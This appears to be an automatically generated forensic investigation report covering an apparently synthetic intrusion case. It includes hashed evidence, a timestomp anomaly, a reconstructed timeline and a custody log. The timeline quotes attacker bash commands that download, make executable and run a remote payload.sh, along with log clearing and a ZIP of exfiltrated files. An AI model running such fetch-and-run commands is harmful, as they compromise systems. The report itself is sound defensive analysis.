# WASP Investigation Report — CASE-2026-LIVE

**Lead Examiner:** Alex Mercer (Senior Forensics Examiner)  
**Organization:** Cyber Incident Response Unit  
**Authorization Reference:** WARRANT-2026-0881  
**Schema Version:** 2.0.0 | **Tool Version:** 1.4.0  

---

## 1. Executive Summary & PS Objectives Matrix

| # | Objective | Status | Findings |
|---|---|---|---|
| 1 | **File metadata extraction** | COMPLETED | Extracted filesystem stats, OOXML properties, PDF metadata, ZIP entries. |
| 2 | **System artefact extraction** | COMPLETED | Extracted MFT, registry hives, EVTX event logs, Prefetch, LNK shortcuts, browser history. |
| 3 | **Timestamp extraction** | COMPLETED | Decoded multi-epoch timestamps normalized to UTC with explainable confidence. |
| 4 | **Chronological timeline reconstruction** | COMPLETED | Generated single normalized super-timeline with 28 records. |
| 5 | **SHA-256 evidence integrity** | VERIFIED | Mandatory SHA-256 computed; custody ledger replayed; Merkle root: `720d1b4a47084c43d5ace1663ec5a66b9453c2123b3160a06f207df08293676c`. |
| 6 | **Structured investigation reports** | COMPLETED | Compiled multi-format reports with provenance, integrity block, and privacy redaction. |

---

## 2. Digital Evidence Inventory (SHA-256 Hashes)

| Evidence ID | Path | Container | Size (Bytes) | SHA-256 Hash | Status |
|---|---|---|---|---|---|

| `EV-AUTH.L` | `evidence/auth.log` | raw | 283 | `b544dfd8cc0d4521f4ba801cd4b9215ef76b6a5f76149038b6171cd664e095e4` | MATCH |

| `EV-BASH_H` | `evidence/bash_history` | raw | 112 | `a45c0410ad9fea5a6fec7056a904d518673c2e1950f124d9383dbdcfbfbdf554` | MATCH |

| `EV-EXFILT` | `evidence/exfiltrated_files.zip` | raw | 317 | `4bc993c920d42446a47dadd1b7eb1f044478d7f63a5cc27cbde7cd4afc3691a2` | MATCH |

| `EV-HISTOR` | `evidence/History` | raw | 8192 | `ddeee48ddcd3e8fd4b88dbe62d5624d7e71983919f0a12ceb3f79844e2322b95` | MATCH |

| `EV-INVEST` | `evidence/investigation_memo.docx` | raw | 813 | `de28e74cc75ab7bc436c1619743c6de86dbfc98363e91879bf39840a8811c7f8` | MATCH |

| `EV-SECURI` | `evidence/Security_Events.jsonl` | raw | 503 | `15957efb2f1573f54296ac349387196a60825acb65518ab856a5179afe1e8ad0` | MATCH |


---




## 4. Cross-Source Corroboration & Anti-Forensics Analysis

- **Corroborated Activity Clusters:** 0
- **Corroborated Events Count:** 0
- **Anti-Forensics / Conflicts Detected:** 1


### Anti-Forensic Anomalies & Timestomp Conflicts
| Severity | Entity | Anomaly Type | Description |
|---|---|---|---|

| **MEDIUM** | `investigation_memo.docx` | `MODIFIED_PRE_CREATION` | Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T18:35:05.253579+00:00 |





---


## 5. Reconstructed Chronological Activity Timeline (Excerpt)

| UTC Timestamp | Action | User | Object / Target | Source Artefact | Corroborated By | Conf. | Rationale |
|---|---|---|---|---|---|---|---|

| `2024-03-10T14:30:00+00:00` | `FILE_CREATE` | [USER_001] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:created metadata |

| `2024-03-10T20:50:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://github.com/malicious/repo` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-10T21:00:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://pastebin.com/raw/d849fa` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-11T01:50:00+00:00` | `FILE_WRITE` | [USER_002] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:modified metadata (⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T18:35:05.253579+00:00) |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4624 |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:15:00+00:00` | `PROCESS_START` | UNKNOWN | `wget http://[IP_004]/payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:15:30+00:00` | `FILE_ACCESS` | UNKNOWN | `sudo` | Linux:sudo:evidence/auth.log | `-` | 0.85 | Syslog entry for sudo (assumed year 2024) |

| `2024-03-11T02:16:00+00:00` | `PROCESS_START` | UNKNOWN | `chmod +x payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:16:15+00:00` | `PROCESS_START` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4688 |

| `2024-03-11T02:17:00+00:00` | `PROCESS_START` | UNKNOWN | `./payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:17:30+00:00` | `SERVICE_INSTALL` | UNKNOWN | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 7045 |

| `2024-03-11T02:18:45+00:00` | `FILE_ACCESS` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:20:00+00:00` | `LOG_CLEARED` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 1102 |

| `2026-10-05T18:35:04.988720+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T18:35:04.995220+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T18:35:05.001724+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T18:35:05.027225+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T18:35:05.043720+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T18:35:05.057720+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T18:35:05.107903+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T18:35:05.141921+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T18:35:05.174430+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T18:35:05.212036+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T18:35:05.253579+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T18:35:05.285087+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-06T00:05:04+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::financial_report.pdf` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |

| `2026-10-06T00:05:04+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::passwords.txt` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |


*(Total reconstructed timeline events: 28)*

---

## 6. Cryptographic Integrity & Attestation

- **Overall Integrity Check:** `PASS`
- **Custody Ledger Replay:** `PASS` (12 entries verified)
- **Derived Files Status:** `PASS`
- **Merkle Root Digest:** `720d1b4a47084c43d5ace1663ec5a66b9453c2123b3160a06f207df08293676c`

---

## 7. Chain of Custody Audit Log

| Seq | Timestamp (UTC) | Actor | Event Type | Prev Hash | Entry Hash |
|---|---|---|---|---|---|

| 1 | `2026-10-05T18:35:05.066004+00:00` | Alex Mercer (Senior Forensics Examiner) | `case_created` | `000000000000...` | `3631d9676a8f...` |

| 2 | `2026-10-05T18:35:05.128651+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `3631d9676a8f...` | `b552c45ba550...` |

| 3 | `2026-10-05T18:35:05.162338+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `b552c45ba550...` | `e172b7e86c71...` |

| 4 | `2026-10-05T18:35:05.198580+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `e172b7e86c71...` | `1332da488343...` |

| 5 | `2026-10-05T18:35:05.236458+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `1332da488343...` | `e128df890a53...` |

| 6 | `2026-10-05T18:35:05.272647+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `e128df890a53...` | `1c73c4a4a2c7...` |

| 7 | `2026-10-05T18:35:05.761041+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `1c73c4a4a2c7...` | `408093ac8a5c...` |

| 8 | `2026-10-05T18:35:05.906420+00:00` | Alex Mercer (Senior Forensics Examiner) | `artefacts_extracted` | `408093ac8a5c...` | `c1fc2d490c5e...` |

| 9 | `2026-10-05T18:35:06.132754+00:00` | Alex Mercer (Senior Forensics Examiner) | `cross_source_corroborated` | `c1fc2d490c5e...` | `307d65875b3b...` |

| 10 | `2026-10-05T18:35:06.148799+00:00` | Alex Mercer (Senior Forensics Examiner) | `threat_rules_scanned` | `307d65875b3b...` | `27e591cf2a6c...` |

| 11 | `2026-10-05T18:35:06.807408+00:00` | Alex Mercer (Senior Forensics Examiner) | `timeline_built` | `27e591cf2a6c...` | `cf531a95a97f...` |

| 12 | `2026-10-05T18:35:06.918648+00:00` | Alex Mercer (Senior Forensics Examiner) | `integrity_verified` | `cf531a95a97f...` | `6dd4c416610d...` |


---
*Generated automatically by WASP v1.4.0.*
